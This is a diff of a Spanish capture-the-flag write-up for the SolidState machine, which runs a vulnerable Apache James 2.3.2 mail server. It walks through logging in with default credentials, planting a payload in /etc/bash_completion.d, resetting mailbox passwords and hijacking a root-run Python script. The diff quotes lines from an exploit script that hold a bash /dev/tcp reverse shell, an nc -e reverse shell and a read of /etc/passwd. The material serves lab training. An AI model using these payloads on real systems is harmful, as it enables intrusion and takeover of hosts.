@@ -3,31 +3,31 @@
 ![](../../../../~gitbook/image.md)Publicado: 13 de Mayo de 2025
 Autor: José Miguel Romero aKa x3m1Sec
 Dificultad: ⭐ Medium
-###📝 Descripción
+### 📝 Descripción
 La máquina SolidState es una máquina Linux con dificultad media que simula un servidor de correo empresarial vulnerable basado en Apache James 2.3.2. La explotación implica abusar de vulnerabilidades en el servicio JAMES, acceder a correos electrónicos internos para conseguir credenciales, y finalmente escalar privilegios aprovechando un script de Python ejecutándose como root con permisos inseguros. Esta máquina enfatiza la importancia de la actualización regular de servicios y la gestión adecuada de permisos en los archivos del sistema.
-###🚀 Metodología
+### 🚀 Metodología
 
-###🔭 Reconocimiento
+### 🔭 Reconocimiento
 
-####Ping para verificación en base a TTL
+#### Ping para verificación en base a TTL
 💡 Nota: El TTL cercano a 64 sugiere que probablemente sea una máquina Linux.
-####Escaneo de puertos
+#### Escaneo de puertos
 
-####Enumeración de servicios
+#### Enumeración de servicios
 
-###🌐 Enumeración Web
+### 🌐 Enumeración Web
 
-####80 HTTP
+#### 80 HTTP
 ![](../../../../~gitbook/image.md)🕷️Fuzzing de directoriosNada relevante ni a destacar en este servicio como posible vector de ataque.
-####25 SMTP (JAMES smtpd 2.3.2)
+#### 25 SMTP (JAMES smtpd 2.3.2)
 
-###💻 Explotación
+### 💻 Explotación
 Durante la fase de enumeración de servicios de nmap hemos visto que este protocolo está ejecutando un servicio JAMES smptpd 2.3.2. Buscando algo de información pública encontramos que la versión es vulnerable a Remote Command Execution (RCE) (Authenticated) y Insecure User Creation Arbitrary File WriteVamos a usar el exploit Remote Command Execution (RCE) (Authenticated) (2)Este exploit abusa del panel de administración remoto y del servidor SMTP del Apache James Server usando las credenciales por defecto `root:root` para inyectar un payload (como una reverse shell) en un archivo del sistema (`/etc/bash_completion.d`). Este archivo será ejecutado automáticamente cuando un usuario inicie sesión en el sistema (por ejemplo, vía SSH), permitiendo ejecutar comandos arbitrarios como una shell inversa hacia el atacante.![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)El problema es que estamos en una máquina virtual y nadie va a iniciar sesión vía ssh, por lo que debemos intentar buscar credenciales para poder intentar conectarnos vía ssh y desencadenar la acción.
-####4555 James Remote Administration
+#### 4555 James Remote Administration
 Iniciamos sesión en James Remote Administration usando telnet y las credenciales por defecto root:rootAl usar el comando listusers enumeramos varios usuarios y también el payload que hemos cargado anteriormente:Recordemos que hemos iniciado sesión como root y una de las opciones que nos permite realizar el setpassword, así que podemos cambiar la contraseña al usuario que queramos:![](../../../../~gitbook/image.md)Ahora iniciamos sesión con james vía POP3 usando las nuevas credencialesAl listar correo no encontramos nada, así que repetimos la misma operación de cambiar la contraseña para el resto de usuarios a ver si encontramos algo.![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)Encontramos unas credenciales para mindy. Probamos a autenticarnos vía ssh con ellas:E inmediatamente ganamos conexión al host remoto en nuestro listener:![](../../../../~gitbook/image.md)
-####Mejora de la shell
+#### Mejora de la shell
 En nuestro host de ataqueEn el host comprometidoObtenemos la primera flag en el directorio de mindy:
-####👑 Escalada de privilegios
+#### 👑 Escalada de privilegios
 Tras enumerar la máquina, comprobamos que sudo no está instalado en la máquina, tampoco hay grupos interesante ni capabilities. Tampoco detectamos una versión vulnerable del kernel, pero al listar procesos vemos algo intesante:![](../../../../~gitbook/image.md)Se está ejecutando un script en python llamado tmp.py como root.Revisamos los permisos del archivo y vemos que tenemos control total sobre el mismo:Así que reemplazamos su contenido por el de una simple python reverse shell:Simple python reverse shell
 https://github.com/orestisfoufris/Reverse-Shell---Python/blob/master/reverseshell.pyA continuación, esperamos unos segundos y recibimos la reverse shell como root para finalmente obtener la flag:Last updated 10 months ago- [📝 Descripción](#descripcion)
 - [🚀 Metodología](#metodologia)
@@ -133,7 +133,7 @@ https://twitter.com/shinris3n
 https://shinris3n.github.io/
 '''
 
-#!/usr/bin/python3
+# !/usr/bin/python3
 
 import socket
 import sys
@@ -155,9 +155,9 @@ port = sys.argv[3]
 
 # Select payload prior to running script - default is a reverse shell executed upon any user logging in (i.e. via SSH)
 payload = '/bin/bash -i >& /dev/tcp/' + local_ip + '/' + port + ' 0>&1' # basic bash reverse shell exploit executes after user login
-#payload = 'nc -e /bin/sh ' + local_ip + ' ' + port # basic netcat reverse shell
-#payload = 'echo $USER && cat /etc/passwd && ping -c 4 ' + local_ip # test remote command execution capabilities and connectivity
-#payload = '[ "$(id -u)" == "0" ] && touch /root/proof.txt' # proof of concept exploit on root user login only
+# payload = 'nc -e /bin/sh ' + local_ip + ' ' + port # basic netcat reverse shell
+# payload = 'echo $USER && cat /etc/passwd && ping -c 4 ' + local_ip # test remote command execution capabilities and connectivity
+# payload = '[ "$(id -u)" == "0" ] && touch /root/proof.txt' # proof of concept exploit on root user login only
 
 print ("[+]Payload Selected (see script for more options): ", payload)
 if '/bin/bash' in payload:
